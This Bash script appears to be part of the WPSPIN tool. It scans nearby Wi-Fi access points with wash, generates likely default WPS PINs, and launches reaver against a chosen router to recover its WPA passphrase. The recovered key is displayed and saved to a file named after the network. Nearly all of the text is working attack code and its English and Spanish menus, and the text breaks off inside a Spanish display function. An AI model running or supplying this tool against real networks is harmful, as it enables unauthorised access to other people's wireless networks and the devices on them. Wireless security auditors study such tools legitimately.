WASH_SCAN(){                                                  # This function will launch wash generate default PIN for the scanned AP and display the result with some colour
if [ "$WALSH_O_WASH" == "wash" ]; then 

   declare -a BSSID                                                      # We declare array to fill with the scan results, bssuid, essid, etc...
   declare -a CHANNEL                                                    # 
   declare -a RSSI                                            
   declare -a WPS
   declare -a LOCKED
   declare -a ESSID 
     for i in 'BSSID' 'CHANNEL' 'RSSI' 'WPS' 'LOCKED' 'ESSID';                               # linking every array with "i"   
       do 
       count=1                                                                                # start from 1
         if [ "$i" == "BSSID" ]; then                                                        # First array for bssid of target AP  
           while read -r line; do                                                            # we read our temp file line by line
             BSSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $1 }')                      # we keep the first field using space as a delimiter (Bssid in the scan=
        elif [ "$i" == "CHANNEL" ]; then                                                    # and so on...
          while read -r line; do
           CHANNEL[${count}]="$line"
           count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $2 }')                      # second field which is the channel number
        elif [ "$i" == "RSSI" ]; then                                                        # etc...
          while read -r line; do
            RSSI[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $3 }') 
       elif [ "$i" == "WPS" ]; then
          while read -r line; do
            WPS[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $4 }')
       elif [ "$i" == "LOCKED" ]; then
          while read -r line; do
            LOCKED[${count}]="$line"
            count=$((count+1))
          done < <( cat wash_scan.txt | awk -F' ' '{ print $5 }')
       elif [ "$i" == "ESSID" ]; then
         while read -r line; do
         ESSID[${count}]="$line"
         count=$((count+1))
         done < <( cat wash_scan.txt | awk -F' ' '{ print $6 }')                        
       fi
  clear
  done                        

else


   declare -a BSSID
   declare -a ESSID
      for i in 'BSSID' 'ESSID';
       do 
       count=1                                                                                # start from 1
         if [ "$i" == "BSSID" ]; then                                                        # First array for bssid of target AP  
           while read -r line; do                                                            # we read our temp file line by line
             BSSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $1 }')    
         elif [ "$i" == "ESSID" ]; then                                                        # second array for essid of target AP  
           while read -r line; do                                                              # we read our temp file line by line
             ESSID[${count}]="$line"                                                           # 
             count=$((count+1))                                                                # and count from one to one
           done < <( cat wash_scan.txt | awk -F' ' '{ print $2 }')
         fi
      clear 
      done
       

fi   

WASH_DISPLAY #################################################################to be defined according to the languages##########################################################

OUTPUT

ATTACK

}





REAVER_CHECK(){      

                                                                           # This function is here to check if reaver is installed, if not the user will be in short menu
which reaver &> /dev/null                                                  # Thanks antares for this trick for fast checking if reaver is present
if [ $? -ne 0 ]; then                                                         
SORTMENUE_WARNING="$NO_REAVER" ########################################### to define according to the language, here to warn about need to install reaver
SHORTMENUE
fi

which walsh &> /dev/null                                                   # if the reaver is bypassed user can have reaver 1.3 with walsh or reaver 1.4 with wash so
if [ $? -ne 0 ]; then                                                      # we determine which one is gonna be used
  WALSH_O_WASH=$( echo "wash")
else
  WALSH_O_WASH=$(echo "walsh") 
fi 
}




ATTACK(){
    
     ATTACK_MENUE_DISPLAY  #############################################  definer according to the language            
    

     if [ "$ATTACK_MENUE_CHOICE" == 1 ]; then                             # first option of attack menu: attack with reaver and default PIN
     echo ""
     echo "$STOP_REAVER"                                                  # little message saying that the attack can be stoped by pressing ctrl and c
     
        if [ "$BIG_MENUE_CHOICE" == 1 ]; then                             # If we have the scan mode we can give the canal in our reaver attack
           sudo reaver -b $BSSID -i $MON_ATTACK -p $PIN -vv -c $CHANNEL -d 2 -t 2 -T 2  | tee  attack.txt    # we put some delay everywhere for not stressing too much AP
        else                                                              # if not we don't put canal
            sudo reaver -b $BSSID -i $MON_ATTACK -p $PIN -vv -d 2 -t 2 -T 2 | tee  attack.txt 
        fi 
     VICTORY_PIN=$(cat  attack.txt | grep "WPS PIN" | cut -d ":" -f2- | cut -c3- | rev | cut -c2- | rev)  # in case the key is found we grep the PIN
     KEY=$(cat  attack.txt | grep "WPA PSK" | cut -d ":" -f2- | cut -c3- | rev | cut -c2- | rev)          # and the WPAPASSPHRASE that will be our variable KEY    
                                                                                # we erase the log
       if [ "$KEY"  == "" ]; then                                                                              # if no passphrase is recovered than 
           
           echo ""
           echo "$FAILED"                                                                                      # failed display a message
           echo ""
         else 
         echo -e " $blanco  WPA$colorbase>>> $rojo $KEY $colorbase "                                           # otherwise appears a success message
         echo "$KEY_FOUND"
        echo "                                                                                                 
        
     KEY FOUND!!! XD

     
        WPA >>>>>>   $KEY

  ESSID    >   $ESSID
  BSSID    >   $BSSID
  PIN      >   $VICTORY_PIN
  WPA      >   $KEY
        

        WPA >>>>>>   $KEY           



WPSPIN for linux   www.crack.wifi.com  www.facebook.com/soufian.ckin2u  www.auditoriaswireless.net

" > $ESSID.txt                                                                                                # data are saved in a little text
        echo -e "                        $azulfluo        $ESSID.txt  $colorbase"
        echo ""
        echo -e "ESSID    >  $blanco  $ESSID  $colorbase "
        echo -e "BSSID    >  $blanco  $BSSID  $colorbase "
        echo -e "PIN      >  $rojo  $VICTORY_PIN $colorbase "
        echo -e "WPA      >  $amarillo  $KEY $colorbase "   
       rm attack.txt &> /dev/null 
       fi
             
     ATTACK 

     elif [ "$ATTACK_MENUE_CHOICE" == 2 ]; then                                           # equal to "select another target"
     
       if [ "$BIG_MENUE_CHOICE" == 2 ]; then                                               # if we are in genrator mode we simply close the loop and go back to the attack menue
          
         echo " "
       
       else
        
         while  [ "$ATTACK_MENUE_CHOICE" == 2 ]; do                                       # in case we want to display again the scan results  
         
        

         WASH_SCAN                                                                          #with reload

         OUTPUT

         ATTACK
         done
       
       fi                                                                            
     
     elif [ "$ATTACK_MENUE_CHOICE" == 3 ]; then                                          # option "go back to previous menu"

     BIG_MENUE

     elif [ "$ATTACK_MENUE_CHOICE" == 4 ]; then                                          # option restart/change language

     unset
     CLEAN
     bash WPSPIN.sh

     else                                                                               # option exit
     CLEAN
     CIAO
     exit 0
  
     fi
}   




BIG_MENUE(){                                                                            

BIG_MENUE_DISPLAY                                                                     # options of the "big menu", WPSPIN with all options available

if [ "$BIG_MENUE_CHOICE" == 1 ]; then                                                 # 1 is washscan = scan with wash and attack with reaver guided

echo ""
echo "$WASHWAIT" #####################################REDIGER SELON LANGUE######### nessage to advice the user that the scan is launched and result will be displayed in a while
echo ""    
sudo xterm -l -lf scan.txt -e $WALSH_O_WASH -i $MON_ATTACK  -C 
# sudo xterm -e   $WALSH_O_WASH -i $MON_ATTACK  -C  2>&1 | tee  scan.txt     # we take out eh two fist line of wash command and send the scan to temp ; do

if [ "$WALSH_O_WASH" == "wash" ]; then 
 cat scan.txt | sed '1,6d' | grep  "........."    > wash_scan.txt
 sudo rm scan.txt &> /dev/null
 else 
 cat scan.txt | sed "1,3d" | grep  "........."    > wash_scan.txt
 sudo rm scan.txt &> /dev/null
fi
WASH_SCAN


  

elif [ "$BIG_MENUE_CHOICE" == 2 ]; then                                              # 2 is the pin generator, the user enter manually the data bssid and essid

  while [[ "$ATTACK_MENUE_CHOICE" -ne 5 ]]; do                                       # we make a while loop to maintain the process enter data - generate pin - attack menu
  
    DATASGENERADOR
    GENERATE
    OUTPUT
    ATTACK
     
  
  done

elif [ "$BIG_MENUE_CHOICE" == 3 ]; then                                          # to change interface, we erase the value of the selected interface and relaunch the selection 

  unset MON_ATTACK                                                               # of the interface
  IFACE
  BIG_MENUE

elif [ "$BIG_MENUE_CHOICE" == 4 ]; then                                          # restart and change language

  CLEAN
  bash WPSPIN.sh

else                                                                             # to exit script

  CIAO
  CLEAN

fi

exit
}





CLEAN(){
unset
rm /tmp/Interface.txt &> /dev/null
rm /tmp/airmon.txt &> /dev/null
rm /tmp/second_scan.txt &> /dev/null
rm wash_scan.txt &> /dev/null
rm attack.txt &> /dev/null
}






#############################################################################################################################################################################
######################################################
#####################################################                  SCRIPT START
#####################################################
####################################################  FIRST START WITH LANGUAGE SELECTION, WE WILL DEFINE THE OUTPUT ACCORDING TO THIS SELECTION#########################
######################################################
unset
CLEAN

echo -e "$magenta
              _       _  _____    _____   _____  _______  _     _ 
             (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_)
             (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)
             (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)
             (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)
              (__) (__) (_)      (_____) (_)    (_______)(_)   (_)    $colorbase

$amarillo www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net$colorbase

               by$blanco kcdtv$colorbase feat.$blanco antares_145$colorbase, $blanco r00tnuLL$colorbase and$blanco 1camaron1
          $colorbase     including computepinC83A35 algorithm by$blanco ZaoChunseng $colorbase

                $azulfluo   DEFAULT PIN GENERATOR & WPS PROTOCOL ATTACK$colorbase

"
                                                       
                                          
SELECTIONLANGUE=0                                  # The script start with a menu to select labnguage, default value is 0 for the variable that set the selection
while [ $SELECTIONLANGUE -eq 0 ]; do               # while this value is equal to zero  
echo -e "                         +---------------------------+     "
echo -e "                         |   $blanco  1$colorbase  -$amarillo  ENGLISH   $colorbase      |     "
echo -e "                         |   $blanco  2$colorbase  -$amarillo  ESPANOL   $colorbase      |     "
echo -e "                         |   $blanco  3$colorbase  -$amarillo  FRANCAIS  $colorbase      |     "
echo -e "                         +---------------------------+     "
echo -e " "
echo ""
read -ep "                                Language : " SELECT                   # we propose to the user to enter a value to define "select"
 if [[ $SELECT == "1" ]]; then                     # if this value is 1
  SELECTIONLANGUE=1                                # then the selected language will be 1, English
   elif [[ $SELECT == "2" ]]; then            
   SELECTIONLANGUE=2                               # 2 will be Spanish
     elif [[ $SELECT == "3" ]]; then
     SELECTIONLANGUE=3                             # 3 will be French
       else                                        # anything else will keep the variable with a value of 0 and bring us back to the beginning of the while loop
       SELECTIONLANGUE=0                           # where the user has to enter his choice for the language
 fi
done  


################################################ WE DEFINE THE FUNCTIONS AND VARIABLES THAT CHANGES WITH LANGUAGE #######################################################
#################################################################
###########################################   THE FUNCTIONS ARE >>>>>>>
################################################### 1 - OUTPUT  > gives model router, default PIN and other elements about target AP   ###############################
################################################### 2 - DATASGENERADOR > the user will enter bssid and essid for the generator mode ####################################3
################################################### 3 - SHORT MENUE > If the user does not have mode monitor he will be limited in his options in short menu
################################################### 4 - SELECT_THEIFACE > prompt the user which is his/her choice
################################################### 5 - WASH_DISPLAY > prompt the user which is his/her choice
################################################### 6 - BIG_MENUE_DISPLAY > Shows the options of the big menu
################################################### 7 - CIAO > you say goodbye, and i say hello, hello hello.
################################################### 8 - ATTACK_MENUE_DISPLAY > Shows the options of attack menu
################################################### 



##########################################    THE VARIABLES ARE >>>>>>>
##################################################  1 . MON_ADVERTENCIA > If the unique chipset is unknown by airmon-ng
#################################################   2 - INTERFACEDESIGN > the top of menu to select interface
#################################################   3 - WASHWAIT > warn the user that the scan with wash is taking place
#################################################   4 - NO_MONITOR_MODE > That will define "WARNING" in the short menu (no mode monitor available, no reaver installed,no wash 
#################################################   5 - NO_REAVER > if there is no wps reaver  installed 
#################################################   6 - FAILED > When the wpa passphrase hasn't been recovered
#################################################   7 - KEY_FOUND > When reaver finds the key
#################################################   8 - STOP_REAVER > shows to the user that he can stop the attack by pressing CTRL+C
#################################################   9 - AIRMON_WARNING > chipset is not fully supported 


#############################################################################################
if [ "$SELECTIONLANGUE" == 1 ]; then  ############################### 1 > ENGLISH LANGUAGE #################################################################################





OUTPUT(){



if [ "$PIN2" == "" ] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "------------------------------------------------------"
echo -e "Company        >  $blanco $FABRICANTE  $colorbase"
echo -e "default essid  >  $blanco $DEFAULTSSID $colorbase"
echo -e "model          >  $blanco $MODEL $colorbase" 
echo -e "------------------------------------------------------"
echo -e "         DEFAULT WPS PIN > $amarillo$PIN   $colorbase"
echo -e "------------------------------------------------------"
  if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde      WPS ENABLED WITH DEFAULT SETTINGS! $colorbase" 
  else
  echo -e "Warning :$magenta NO WPS ENABLED WITH DEFAULT SETTINGS! $colorbase"
  fi
  if [ "$SPECIAL" == "0" ] ; then
  echo -e "------------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "------------------------------------------------------"
  echo -e "Warning :$magenta ¡POSSIBLE AP RATE LIMIT! $colorbase"
  else
  echo -e "------------------------------------------------------"
  echo -e "$magenta Not sure: several models with this bssid start  $colorbase"
  fi

elif [[ "$PIN2" -gt 1 ]] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "------------------------------------------------------"
echo -e "Company        > $blanco $FABRICANTE  $colorbase"
echo -e "default essid  >  $blanco $DEFAULTSSID $colorbase"
echo -e "model          >  $blanco $MODEL $colorbase" 
echo -e "------------------------------------------------------"
echo -e "various possible default PIN > $amarillo$PIN  $PIN2  $PIN3  $colorbase"
  if [[ "$PIN4" -gt 1 ]] ; then
  echo -e " $amarillo $PIN4 $PIN5  $PIN6  $PIN7  $PIN8  $colorbase"
  echo -e "------------------------------------------------------"
  else
  echo -e "------------------------------------------------------"
  fi
    if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde      WPS ENABLED WITH DEFAULT SETTINGS! $colorbase" 
  else
  echo -e "Warning :$magenta NO WPS ENABLED WITH DEFAULT SETTINGS! $colorbase"
  fi
  if [ "$SPECIAL" = "0" ] ; then
  echo -e "------------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "------------------------------------------------------"
  echo -e "Warning :$magenta ¡POSSIBLE AP RATE LIMIT! $colorbase"
  else
  echo -e "------------------------------------------------------"
  echo -e "$magenta Not sure: several models with this bssid start  $colorbase"
  fi

else

echo -e "--------------------------------------------------
     $orange  ¡UNKNOWN OR UNSUPPORTED MODEL!   $colorbase
--------------------------------------------------
                 POSSIBLE PIN >$amarillo$PIN $colorbase"
fi
 
}




DATASGENERADOR(){
echo ""
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Insert eSSID and press <Enter> : "  ESSID          # essid has a variable                
echo "  "
read -ep "                2 > Insert bSSID and press <Enter> : " BSSID           # bssid has variable
echo "  "
while !(echo $BSSID | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           # fast and smart filter for conformity bssid with loop over comditions... gracias antares XD
echo -e " $rojo Error : MAC No Conform $colorbase"
echo "  "
read -ep "                2 > Insert bSSID and press <Enter> : " BSSID 
echo "  "            
done
}


SHORTMENUE(){                                                 # Reduced menue inside which the user will be blocked  if no monitor interface is possible, no scan, no attack


echo ""
echo "$SORTMENUE_WARNING"
echo ""
echo ""
echo ""
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GENERATE PIN$colorbase              |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  RELOAD INTERFACES CHECK$colorbase   |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  EXIT WPSPIN$colorbase               |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo -e ""
echo ""
echo ""
echo ""
read -ep "                              Your choice : " SHORTMENUE_CHOICE                    

if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT

echo -e " "
echo -e "      ......  press <enter> to continue......"    # pause to let the user copy the given data 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN
CIAO

exit

else

echo -e " ................$rojo  incorrect option ........"

 SHORTMENUE
    

fi

}




SELECT_THEIFACE (){
read -ep "                           Select interface : " i        # ask the user to choose among available interfaces   
}


WASH_DISPLAY(){                                    # WE make a break here to be able to just display the results later and because it was confusing for langiages
if [ "$WALSH_O_WASH" == "wash" ]; then 

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID         RSSI  WPS  Locked    PIN    Channel    ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi

for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE

  if [ "$WALSH_O_WASH" == "wash" ]; then  
    if [ "$LOCK_CHECK" = "No" ]; then
      DISPLAY_LOCKED=$( echo -e "$verde  No$colorbae")
    else
      DISPLAY_LOCKED=$( echo -e "$rojo Yes$colorbae")  
    fi
    if [ "$CHANNEL_CHECK" -lt 10 ]; then
      DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
    else
      DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
    fi  
  fi

  if [ "$i" -lt 10 ]; then
    NUM=$( echo -e " $amarillo$i$colorbase")
  else
    NUM=$( echo -e "$amarillo$i$colorbase")
  fi 


  if [ "$UNKNOWN" = 1 ]; then
    DISPLAY_PIN=$( echo -e "$orange$PIN$colorbase" )
  else
    DISPLAY_PIN=$( echo -e "$verdefluo$PIN$colorbase" ) 
  fi
  
  if [ "$WALSH_O_WASH" == "wash" ]; then
    echo -e " $NUM   $blanco$BSSID$colorbase   ${RSSI[${i}]}   ${WPS[${i}]}  $DISPLAY_LOCKED    $DISPLAY_PIN   $DISPLY_CHANNEL    $blanco$ESSID$colorbase "
  else
    echo -e " $NUM    $blanco$BSSID$colorbase         $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
  fi
done
echo ""
echo "--------------------------------------------------------------------------------"
echo ""
read  -p "Introduce target number : " i
CONFORMITY=$(echo ${#BSSID[@]})
  
  until [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]; do
    echo -e "     $magenta INVALID CHOICE  $colorbase"
    read  -p "Introduce target number : " i
  done

unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8 && unset SPECIAL

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})

GENERATE

} 




BIG_MENUE_DISPLAY(){

echo -e "$azulfluo
              _       _  _____    _____   _____  _______  _     _ 
             (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_)
             (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)
             (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)
             (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)
              (__) (__) (_)      (_____) (_)    (_______)(_)   (_)    $colorbase

$amarillo www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net$colorbase


"
echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  AUTOMATED MODE (WASH AND REAVER)$colorbase   |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GENERATOR (WITH ATTACK MENU)$colorbase   |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CHANGE INTERFACE$colorbase                   |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  RESTART OR CHANGE LANGUAGE$colorbase         |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  EXIT$colorbase                               |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo ""
echo ""
read -ep "                            enter your choice : " BIG_MENUE_CHOICE

until [[ "$BIG_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  &&  [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]]; do
  BIG_MENUE_DISPLAY
done

}




CIAO(){

echo ""
UR=$(whoami) && echo -e "                       Cheers $verdefluo $UR$colorbase
                             , see you in$amarillo crack-wifi.com $colorbase
                              $amarillo    lampiweb.com$colorbase and$amarillo auditoriaswireless.net$colorbase  "
echo ""
echo "                        -  (O o)  -         "           
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"

}



ATTACK_MENUE_DISPLAY(){
echo -e "                  "
echo -e "              Target > $blanco$ESSID $colorbase mac > $blanco$BSSID $colorbase"
echo -e "              +----------------------------------------------------+  "
echo -e "              |$blanco   1 $colorbase -$amarillo ATTACK TARGET WITH REAVER AND PIN $rojo $PIN$colorbase |  "
echo -e "              |$blanco   2 $colorbase -$amarillo SELECT ANOTHER TARGET$colorbase                       |  "
echo -e "              |$blanco   3 $colorbase <$amarillo GO BACK TO PREVIOUS MENU$blanco /$amarillo RESCAN$colorbase           |  "
echo -e "              |$blanco   4 $colorbase -$amarillo RESTART$blanco /$amarillo CHANGE LANGUAGE$colorbase                   |  "
echo -e "              |$blanco   5 $colorbase -$amarillo EXIT $colorbase                                       |  " 
echo -e "              +----------------------------------------------------+  "
echo ""
echo ""
read -ep "                               your choice : " ATTACK_MENUE_CHOICE

until [[ "$ATTACK_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do
  ATTACK_MENUE_DISPLAY
done

}


 



MON_ADVERTENCIA=$( echo -e "                                        
                 $magenta              WARNING 
$colorbase
$blanco   Only one chipset is avalaible and airmon-ng doesn't fully recognize it
                scanning and WPS attack may not work properly :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng





INTERFACEDESIGN=$( echo -e "
                   NUMBER      INTERFACE       CHIPSET
              ---------------------------------------------------   
$blanco")                                                               # up part of the interface selection menu   





WASHWAIT=$( echo -e "                $verdefluo       THE SCAN WITH WASH IS LAUNCHED$colorbase 
$blanco
Default PIN will be displayed:
  
  - in$verdefluo green$blanco if the device is supported 
  - in$orange orange$blanco if the device is unknown or unsupported $colorbase

         $magenta             CLOSE THE SCAN WINDOWS TO GET TO THE NEXT STEP $colorbase ")
 





NO_MONITOR_MODE=$(echo -e "$rojo          WARNING$colorbase :$amarillo  NO COMPATIBLE WIRELESS INTERFACE IS AVAILABLE  $colorbase 
$blanco     WPSPIN will be executed in a reduced mode without scanning or attack$colorbase
$blanco             You can reload interface checking with option 2$colorbase")




NO_REAVER=$(echo -e "$rojo          WARNING$colorbase :$amarillo    REAVER WPS IS NOT PRESENT IN THE SYSTEM  $colorbase 
$blanco     WPSPIN will be executed in a reduced mode without scanning or attack$colorbase
$blanco    Install reaver 1.3 or reaver 1.4 (by svn) to enjoy all WPSPIN features$colorbase")



FAILED=$(echo -e " 
                       +-----------------------------------+
                       |     $blanco   The attack has failed $colorbase     |
                       +-----------------------------------+ 
                       |  $rojo     WPA PASSPHRASE NOT FOUND!$colorbase   |  
                       +-----------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +------------------------------------+
                      |$verdefluo     WPA PASSPHRASE RECOVERED!     $colorbase |
                      +------------------------------------+
                      Results saved in your WPSPIN folder in $colorbase "
 )




STOP_REAVER=$(echo -e " $rojo                      < CTRL + C > TO STOP THE ATTACK $colorbase "
 )


AIRMON_WARNING=$(echo -e "
 $magenta                     WARNING! UNKNOWN CHIPSET SELECTED

$blanco                   Scan and attack may not work properly
$blanco               You should use option 3 and change interface$colorbase "
 )

##########################################################################################
elif [ "$SELECTIONLANGUE" == 2 ]; then ################################### 2 > ESPAÑOL  ########################################################################

OUTPUT(){

if [ "$PIN2" == "" ] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "--------------------------------------------------"
echo -e "Fabricante >  $blanco $FABRICANTE  $colorbase"
echo -e "essid      >  $blanco $DEFAULTSSID $colorbase"
echo -e "modelo     >  $blanco $MODEL $colorbase" 
echo -e "--------------------------------------------------"
echo -e "         PIN WPS POR DEFECTO > $amarillo$PIN   $colorbase"
echo -e "--------------------------------------------------"
  if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde          ¡WPS ACTIVADO POR DEFECTO! $colorbase" 
  else
  echo -e "Cuidado :$magenta ¡WPS NO ACTIVADO POR DEFECTO! $colorbase"
  fi
  if [ "$SPECIAL" == "0" ] ; then
  echo -e "--------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "--------------------------------------------------"
  echo -e "Cuidado :$magenta ¡PROBABLE BLOQUEO DEL WPS! $colorbase"
  else
  echo -e "--------------------------------------------------"
  echo -e "PIN no seguro:$magenta varios modelos con mismo inicio bssid  $colorbase"
  fi

elif [[ "$PIN2" -gt 1 ]] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "--------------------------------------------------"
echo -e "Fabricante >  $blanco $FABRICANTE  $colorbase"
echo -e "essid      >  $blanco $DEFAULTSSID $colorbase"
echo -e "modelo     >  $blanco $MODEL $colorbase" 
echo -e "--------------------------------------------------"
echo -e "varios PIN posibles > $amarillo$PIN  $PIN2  $PIN3  $colorbase"
  if [[ "$PIN4" -gt 1 ]] ; then
  echo -e " $amarillo $PIN4 $PIN5  $PIN6  $PIN7  $PIN8  $colorbase"
  echo -e "--------------------------------------------------"
  else
  echo -e "--------------------------------------------------"
  fi
  if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde          ¡WPS ACTIVADO POR DEFECTO! $colorbase" 
  else
  echo -e "Cuidado :$magenta ¡WPS NO ACTIVADO POR DEFECTO! $colorbase"
  fi
  if [ "$SPECIAL" == "0" ] ; then
  echo -e "--------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "--------------------------------------------------"
  echo -e "Cuidado :$magenta ¡PROBABLE BLOQUEO DEL WPS! $colorbase"
  else
  echo -e "--------------------------------------------------"
  echo -e "PIN no seguro:$magenta varios modelos con mismo inicio bssid  $colorbase"
  fi

else

echo -e "--------------------------------------------------
     $orange  ¡bSSID DESCONOCIDO O NO SOPORTADO!   $colorbase
--------------------------------------------------
                PIN POSIBLE >$amarillo$PIN $colorbase"
fi

}

DATASGENERADOR(){
echo ""
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Insertar el Essid y darle a <Enter> : "  ESSID          # essid como variable - gracias r00tnuLL por el "ep" ;)                
echo "  "
read -ep "                2 > Insertar el Bssid y darle a <Enter> : " BSSID           # bssid como variable
echo "  "
  while !(echo $BSSID | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
   do                                                              # filtro bssid haciendo un bucle while sobre condición... gracias antares XD
   echo -e " $rojo Error de sintaxis : MAC Non Conforme $colorbase"
   echo "  "
   read -ep "                2 > Insertar el Bssid y darle a <Enter> : " BSSID
   echo "  "            
  done
}


SHORTMENUE(){                                                 # Menu en el cual esta limitado el usuario sin mode monitor, solo generador



                       # 3 es para salirt de WPSPIN, hasdta que el usario no entre tres nos quedemos en el menu

echo ""
echo "$SORTMENUE_WARNING"
echo ""
echo ""
echo ""
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GENERAR PIN$colorbase               |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  REDETECTAR INTERFACES$colorbase     |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  SALIR$colorbase                     |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo ""
echo ""
echo ""
echo -e ""
read -ep "                              su elección : " SHORTMENUE_CHOICE                    

if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT

echo -e " "
echo -e "      ......pulsa <enter> para seguir adelante......"    # pausamos el proceso ara que el usario pueda apuntar o copiar los datos 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN
CIAO

exit

else

echo -e " ................  $magenta opción inválida$colorbase ........"

 SHORTMENUE
    

fi

}


SELECT_THEIFACE (){
read -ep "                           elegir la interfaz : " i        # ask the user to choose among avlaible interfaces   
}



WASH_DISPLAY(){    


if [ "$WALSH_O_WASH" == "wash" ]; then                        # WE make a break here to be able to just display the results later and because it was confusing for langiages


echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID         RSSI  WPS Abierto    PIN    Canal    ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi

for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE
